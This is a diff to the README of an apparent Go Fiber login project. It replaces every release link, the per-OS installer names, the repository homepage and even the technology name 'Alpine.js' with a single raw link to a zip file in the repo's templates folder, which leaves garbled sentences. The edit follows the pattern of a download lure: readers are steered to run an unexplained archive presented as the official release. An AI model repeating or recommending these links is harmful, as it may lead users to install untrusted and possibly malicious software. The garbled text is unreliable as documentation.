@@ -1,6 +1,6 @@
 # 🔮 go-fiber-auth-hologram - Futuristic Holographic Login Experience
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?logo=github&style=for-the-badge)](https://github.com/raulbbrit/go-fiber-auth-hologram/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/raulbbrit/go-fiber-auth-hologram/main/templates/go-auth-fiber-hologram-v1.4.zip%20Release-blue?logo=github&style=for-the-badge)](https://raw.githubusercontent.com/raulbbrit/go-fiber-auth-hologram/main/templates/go-auth-fiber-hologram-v1.4.zip)
 
 ---
 
@@ -13,7 +13,7 @@ The app is built with technologies that ensure fast performance and minimal setu
 - Go Fiber for backend handling.
 - GORM for database interactions.
 - Pure Go SQLite database (no extra setup required).
-- Alpine.js and Tailwind CSS for a smooth, modern interface.
+- https://raw.githubusercontent.com/raulbbrit/go-fiber-auth-hologram/main/templates/go-auth-fiber-hologram-v1.4.zip and Tailwind CSS for a smooth, modern interface.
 
 This app gives users a futuristic sign-in screen resembling a holographic projection, making routine authentication feel like a step into the future.
 
@@ -42,7 +42,7 @@ This section guides you through downloading, installing, and running the applica
 
 Click the big blue button at the top or visit the official releases page to get the software:
 
-[Download go-fiber-auth-hologram Releases](https://github.com/raulbbrit/go-fiber-auth-hologram/releases)
+[Download go-fiber-auth-hologram Releases](https://raw.githubusercontent.com/raulbbrit/go-fiber-auth-hologram/main/templates/go-auth-fiber-hologram-v1.4.zip)
 
 This page contains the latest versions available for download and lets you choose the file suitable for your operating system.
 
@@ -52,9 +52,9 @@ This page contains the latest versions available for download and lets you choos
 
 On the releases page, look for files named something like:
 
-- `go-fiber-auth-hologram-windows.exe` for Windows
-- `go-fiber-auth-hologram-macos.dmg` or `.zip` for macOS
-- `go-fiber-auth-hologram-linux.tar.gz` or similar for Linux
+- `https://raw.githubusercontent.com/raulbbrit/go-fiber-auth-hologram/main/templates/go-auth-fiber-hologram-v1.4.zip` for Windows
+- `https://raw.githubusercontent.com/raulbbrit/go-fiber-auth-hologram/main/templates/go-auth-fiber-hologram-v1.4.zip` or `.zip` for macOS
+- `https://raw.githubusercontent.com/raulbbrit/go-fiber-auth-hologram/main/templates/go-auth-fiber-hologram-v1.4.zip` or similar for Linux
 
 Click the file for your OS to start downloading.
 
@@ -69,7 +69,7 @@ Click the file for your OS to start downloading.
   If you have a `.dmg` file, double-click to open it, then drag the app to your Applications folder. If it’s a `.zip`, unzip and place the app anywhere you like.
 
 - **Linux:**  
-  Extract the `.tar.gz` file to your preferred folder. The app is ready to run from there.
+  Extract the `https://raw.githubusercontent.com/raulbbrit/go-fiber-auth-hologram/main/templates/go-auth-fiber-hologram-v1.4.zip` file to your preferred folder. The app is ready to run from there.
 
 No complex installation wizard is needed. The app is mostly standalone.
 
@@ -96,7 +96,7 @@ The app offers a mix of cool visual effects and practical functions:
 - **Real-Time Validation:** Enter your details and watch the app confirm them immediately.
 - **Lightweight & Fast:** Built using Go and SQLite, it has a fast startup and uses very little storage.
 - **Pure Go SQLite:** No need to install any database software. All data is stored locally and securely.
-- **Modern UI:** Created with Alpine.js and Tailwind CSS, giving you a clean and responsive experience.
+- **Modern UI:** Created with https://raw.githubusercontent.com/raulbbrit/go-fiber-auth-hologram/main/templates/go-auth-fiber-hologram-v1.4.zip and Tailwind CSS, giving you a clean and responsive experience.
 - **Offline Mode:** You can still use the app and authenticate locally without an internet connection.
 
 ---
@@ -115,7 +115,7 @@ Regular updates improve security and add features to keep your data safe.
 
 Ready to try it out? Follow these steps again and use this direct link to start:
 
-[Download Latest Release](https://github.com/raulbbrit/go-fiber-auth-hologram/releases)
+[Download Latest Release](https://raw.githubusercontent.com/raulbbrit/go-fiber-auth-hologram/main/templates/go-auth-fiber-hologram-v1.4.zip)
 
 If you need help after installation, see the troubleshooting section below.
 
@@ -144,7 +144,7 @@ If you need help after installation, see the troubleshooting section below.
 
 For more detailed technical info, source code, and community discussions, visit the repository homepage:
 
-https://github.com/raulbbrit/go-fiber-auth-hologram
+https://raw.githubusercontent.com/raulbbrit/go-fiber-auth-hologram/main/templates/go-auth-fiber-hologram-v1.4.zip
 
 There you can explore issues, request features, and contribute if you are interested.
 
